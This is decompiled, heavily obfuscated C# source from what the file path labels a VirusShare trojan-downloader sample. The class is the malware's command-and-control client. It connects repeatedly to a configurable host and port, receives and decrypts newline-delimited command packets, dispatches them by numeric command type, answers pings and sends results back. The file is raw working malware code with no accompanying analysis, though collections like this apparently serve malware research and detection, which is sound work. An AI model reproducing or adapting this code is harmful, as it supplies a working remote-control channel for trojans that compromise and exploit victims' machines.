// Decompiled with JetBrains decompiler
// Type: ᥟޱഁेࠃᵷᣚ.ࣶᝀࣃ
// Assembly: lgy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F6858297-EDCC-46A7-BF64-CBC6BE6B3CD4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Downloader.MSIL.Crypted.ej-8021b1adb21670f837224cd99ccee8599abd7a84c7c3cf7b87df9da753a7739c.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ᥟޱഁेࠃᵷᣚ
{
  internal class \u08F6ᝀ\u08C3
  {
    private Socket ᶏ݉ࡂᕄ;
    private bool ࠆ;
    private Thread ផᡷᑰ̣\u0FCC;
    private Thread Үय़ඕ\u0382\u1BFB\u0E89กఊໞ;
    private string ᅻᮈᗬ;
    private int ṑ;
    private string ག\u00F7ఎ\u1BFFഏ\u02D8\u1391G\u089B;

    public \u08F6ᝀ\u08C3(string Host, int Port, string Password)
    {
      this.ᅻᮈᗬ = Host;
      this.ṑ = Port;
      this.ག\u00F7ఎ\u1BFFഏ\u02D8\u1391G\u089B = Password;
      this.ࠆ = false;
    }

    public Socket \u0B4Bୡ\u0EFD => this.ᶏ݉ࡂᕄ;

    public bool ᦹ => this.ࠆ;

    public string \u1ADA => this.ᅻᮈᗬ;

    public int \u1DE0ᰄי => this.ṑ;

    public string ᎣՒ\u0DCEḖ => this.ག\u00F7ఎ\u1BFFഏ\u02D8\u1391G\u089B;

    public void \u0E31ฬࠎЙ() => this.ᨆᡢᬸल\u09E5ᣃቪᚖЙ();

    private void ᨆᡢᬸल\u09E5ᣃቪᚖЙ()
    {
      if (this.ࠆ)
        return;
      this.Үय़ඕ\u0382\u1BFB\u0E89กఊໞ = new Thread((ThreadStart) (() =>
      {
        this.ᶏ݉ࡂᕄ = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        while (!this.ᶏ݉ࡂᕄ.Connected)
        {
          try
          {
            this.ᶏ݉ࡂᕄ.Connect(this.ᅻᮈᗬ, this.ṑ);
          }
          catch
          {
            Thread.Sleep(TimeSpan.FromSeconds((double) ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u0D56ၴ));
          }
        }
        this.\u0AF4ᆎᎲፎ();
      }));
      this.Үय़ඕ\u0382\u1BFB\u0E89กఊໞ.Start();
    }

    private void \u0AF4ᆎᎲፎ()
    {
      if (this.ࠆ)
        return;
      this.ࠆ = true;
      if (this.ᴒ᳦\u1B4Dఛᢝ\u1AF2ୖḖ == null)
        return;
      this.ᴒ᳦\u1B4Dఛᢝ\u1AF2ୖḖ((object) this, (EventArgs) null);
    }

    public void \u1ACCӴᆊᘗృ()
    {
      this.ផᡷᑰ̣\u0FCC = new Thread(new ThreadStart(this.ዹẛႯ\u1B5D่\u02F2));
      this.ផᡷᑰ̣\u0FCC.Start();
    }

    private void ዹẛႯ\u1B5D่\u02F2()
    {
      try
      {
        MemoryStream ms = new MemoryStream();
        byte[] array;
        do
        {
          array = new byte[this.ᶏ݉ࡂᕄ.ReceiveBufferSize];
          int num = this.ᶏ݉ࡂᕄ.Receive(array, 0, array.Length, SocketFlags.Partial);
          if (num <= 0)
            throw new SocketException();
          Array.Resize<byte>(ref array, num);
          ms.Write(array, 0, num);
        }
        while (!(char.ConvertFromUtf32((int) array[array.Length - 1]) == "\n"));
        ms.Close();
        new Thread((ThreadStart) (() =>
        {
          this.\u0899ڷࡐkоរ(ms.ToArray());
          ms.Dispose();
          ms = (MemoryStream) null;
        })).Start();
      }
      catch (SocketException ex)
      {
        this.Рঃ\u001A\u0482\u0092ሡኍ(true);
        return;
      }
      catch (Exception ex)
      {
        this.Рঃ\u001A\u0482\u0092ሡኍ(true);
        Console.WriteLine(ex.Message);
      }
      this.ዹẛႯ\u1B5D่\u02F2();
    }

    private void \u0899ڷࡐkоរ(byte[] ا)
    {
      List<byte> byteList = new List<byte>();
      for (int index = 0; index < ا.Length; ++index)
      {
        if (char.ConvertFromUtf32((int) ا[index]) != "\n")
        {
          byteList.Add(ا[index]);
        }
        else
        {
          this.\u0F10Ȃ৪ఉ\u0FC8ᚓϯ(byteList.ToArray());
          byteList.Clear();
        }
      }
    }

    private void \u0F10Ȃ৪ఉ\u0FC8ᚓϯ(byte[] டʑᛈ᮲)
    {
      try
      {
        MemoryStream memoryStream = new MemoryStream(ґ.ᢝҳᔏ\u0C54ᇗᎶᓠয̙(டʑᛈ᮲, true));
        byte[] buffer = new byte[4];
        memoryStream.Read(buffer, 0, buffer.Length);
        \u08F6ᝀ\u08C3.ൠᙣෛ̛\u02E6 int32 = (\u08F6ᝀ\u08C3.ൠᙣෛ̛\u02E6) BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[memoryStream.Length - 4L];
        memoryStream.Read(numArray, 0, numArray.Length);
        memoryStream.Close();
        memoryStream.Dispose();
        if (int32 != \u08F6ᝀ\u08C3.ൠᙣෛ̛\u02E6.ᵞະՎ଼ອƝᄸ)
        {
          if (this.ᠱव\u1379ᙕግ != null)
            this.ᠱव\u1379ᙕግ((object) this, new \u16F9ຂ\u0AC6ᶛỠ\u0F3C\u0CDFڂ\u1F1E(numArray, numArray.Length, int32));
        }
        else
          this.\u09FAᕅᎽ\u09D4\u0E60ჷ();
        டʑᛈ᮲ = (byte[]) null;
      }
      catch
      {
        \u0F28 obj = new \u0F28();
        obj.Write("Broken Packet");
        this.ᐫḅӯȉڛ(new \u173AݎᮜఝỼᔩ\u0AFEҊᇅ(\u08F6ᝀ\u08C3.ൠᙣෛ̛\u02E6.ᵂᨭᔵ\u0E63\u1757ᛳቃ័, obj.ݳг̟\u19FBोᨋᖥṈ\u0C64()).\u1A76Ἢཿ());
      }
    }

    public int ᐫḅӯȉڛ(byte[] _param1)
    {
      try
      {
        int sent = this.ᶏ݉ࡂᕄ.Send(_param1, 0, _param1.Length, SocketFlags.Partial) + this.ᶏ݉ࡂᕄ.Send(this.\u1CF2ᨁᮕ\u0861ᭉ੪\u02EF؁, 0, 1, SocketFlags.Partial);
        if (this.ẇᘇ\u18FB\u0BFBڮ != null && sent != 0)
          this.ẇᘇ\u18FB\u0BFBڮ((object) this, new Ⴘᨹ\u0B12\u19DAಸŭߊ(sent));
        return sent;
      }
      catch
      {
        return 0;
      }
    }

    private byte[] \u1CF2ᨁᮕ\u0861ᭉ੪\u02EF؁ => Encoding.ASCII.GetBytes("\n");

    private void \u09FAᕅᎽ\u09D4\u0E60ჷ() => this.ᐫḅӯȉڛ(new \u173AݎᮜఝỼᔩ\u0AFEҊᇅ(\u08F6ᝀ\u08C3.ൠᙣෛ̛\u02E6.ᵞະՎ଼ອƝᄸ, new byte[0]).\u1A76Ἢཿ());

    public void ᙆ\u0097ŏẁᵬ(string _param1)
    {
      \u0F28 obj = new \u0F28();
      obj.Write(_param1);
      this.ᐫḅӯȉڛ(new \u173AݎᮜఝỼᔩ\u0AFEҊᇅ(\u08F6ᝀ\u08C3.ൠᙣෛ̛\u02E6.ᵂᨭᔵ\u0E63\u1757ᛳቃ័, obj.ݳг̟\u19FBोᨋᖥṈ\u0C64()).\u1A76Ἢཿ());
    }

    public bool Рঃ\u001A\u0482\u0092ሡኍ(bool זӺᘠȢᢿᑣᧄm)
    {
      if (!this.ࠆ)
        return false;
      this.ᗏၑᝫ\u139E᭙\u1AA6();
      this.ࠆ = false;
      if (זӺᘠȢᢿᑣᧄm && this.ስᨋំදᎦ\u173F\u009F != null)
        this.ስᨋំදᎦ\u173F\u009F((object) this, (EventArgs) null);
      return true;
    }

    public void ᗏၑᝫ\u139E᭙\u1AA6()
    {
      try
      {
        this.ᶏ݉ࡂᕄ.Close();
        this.ᶏ݉ࡂᕄ = (Socket) null;
      }
      catch
      {
      }
      try
      {
        this.ផᡷᑰ̣\u0FCC.Abort();
        this.ផᡷᑰ̣\u0FCC = (Thread) null;
      }
      catch
      {
      }
    }

    public event EventHandler Ǖᔍൎᨧʟ;

    public event EventHandler ၛ\u0FFC\u02C3\u0EA4ᗈ;

    public event EventHandler<Ⴘᨹ\u0B12\u19DAಸŭߊ> \u1716ୄజҘᚻ;

    public event EventHandler<\u16F9ຂ\u0AC6ᶛỠ\u0F3C\u0CDFڂ\u1F1E> ឨҿ\u0C70\u1368ᑉॿ;

    public enum ൠᙣෛ̛\u02E6
    {
      ˮۣ\u0FE2௬ = 0,
      \u003F\u08C9ᐤ\u1AA9ˮ = 1,
      ᆹñᷭํқත = 2,
      ώ = 3,
      ᑾᦓʀೠ = 4,
      ঀᄫ៩\u0A0Cᜇ\u0EF4\u171Bᤝݸ = 5,
      ᴛᯍݻѦीؕ = 6,
      \u1AF9૭ໂၬб\u05EFऻ\u086E = 7,
      \u1BA4࣮ = 8,
      ᗐ\u089Bѣ̂ఏ٣ = 9,
      \u137Dᱧಽ᳞ = 15, // 0x0000000F
      ဠਘ\u03A2ጹᮾ = 16, // 0x00000010
      ᢹऴၱࠍزᮝ\u19CD = 17, // 0x00000011
      \u1B42ᷙ = 18, // 0x00000012
      ᵞະՎ଼ອƝᄸ = 19, // 0x00000013
      ฬކყఝᢸᣋ = 20, // 0x00000014
      ᵂᨭᔵ\u0E63\u1757ᛳቃ័ = 21, // 0x00000015
      \u1BFB\u1809aỜ = 22, // 0x00000016
      \u0E61 = 23, // 0x00000017
      \u19CDਁ\u0CD1ӣ = 24, // 0x00000018
      Ĕ̗Ų\u087Bᆪ\u00A9ඒၕߒ = 25, // 0x00000019
    }
  }
}
